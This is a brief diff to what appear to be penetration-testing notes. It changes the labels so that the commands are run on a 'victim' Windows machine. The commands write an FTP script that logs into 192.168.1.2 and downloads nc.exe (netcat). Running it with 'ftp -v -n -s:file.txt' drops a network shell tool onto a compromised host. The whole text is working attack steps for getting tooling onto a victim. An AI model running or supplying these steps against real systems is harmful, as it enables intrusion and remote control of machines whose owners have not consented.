@@ -1,5 +1,4 @@
-Linux System(Attacking machine)
-
+On Windows (victim machine run the commands below)
 echo open 192.168.1.2 21> file.txt
 echo USER username>> file.txt
 echo password>> file.txt
@@ -7,6 +6,6 @@ echo bin >> file.txt
 echo GET nc.exe >> file.txt
 echo bye >> file.txt
 
-Windows (Target machine)
+After running the above commands, run the command below to execute the file
 
 ftp -v -n -s:file.txt
